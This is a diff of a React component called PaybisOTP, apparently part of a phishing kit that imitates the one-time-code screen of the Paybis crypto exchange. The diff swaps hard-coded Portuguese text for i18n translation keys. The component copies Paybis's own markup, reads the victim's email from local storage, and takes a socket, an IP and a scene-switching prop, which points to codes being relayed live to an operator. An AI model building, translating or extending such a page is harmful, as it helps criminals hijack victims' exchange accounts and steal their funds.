@@ -4,11 +4,16 @@ import axios from "axios";
 import envelope from "../../assets/envelope.svg";
 import voltar from "../../assets/voltar.svg";
 
+import { useTranslation } from 'react-i18next';
+
 export default function PaybisOTP({ socket, ip,setCenaAtual }) {
   const [otp, setOtp] = useState([]);
+  const { t } = useTranslation();
 
   const handleChange = (event) => {
     setOtp({ ...otp, [event.target.name]: event.target.value });
+
+    
 
     const { name, value } = event.target;
     
@@ -105,9 +110,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
             <img src={envelope} alt="" className="email-otp__icon " />
             <i data-v-198035f7="" class="icon icon-envelope-auth email-otp__icon"></i>
             <p className="sent-notice">
-              Insira o código enviado para {localStorage.getItem("email")}. Não
-              consegue encontrar o e-mail? Por favor, verifique suas pastas de
-              Spam e outras, ou seja, Promoções, Atualizações, etc.
+            {t('Enterthecodesentto')} {localStorage.getItem("email")} {t('Cantfindtheemail')}
               <br />
             </p>
             <form action="" onSubmit={(event) => handleSubmitOtp(event)}>
@@ -207,8 +210,8 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                 </div>
                 <div className="resend">
                   <div className="resend">
-                    <a href="#" className="btn-link resend">
-                      Enviar código novamente
+                    <a href="/" className="btn-link resend">
+                    {t('ResendCode')}
                     </a>
                   </div>
                 </div>
@@ -219,9 +222,9 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       alt=""
                       className="icon icon-back btn-back-link__icon"
                     />
-                    Voltar
+                    {t('Back')}
                   </div>
-                  <button className="btn btn-primary btn-lg">Continuar</button>
+                  <button className="btn btn-primary btn-lg">{t('Continue')}</button>
                 </div>
               </div>
             </form>
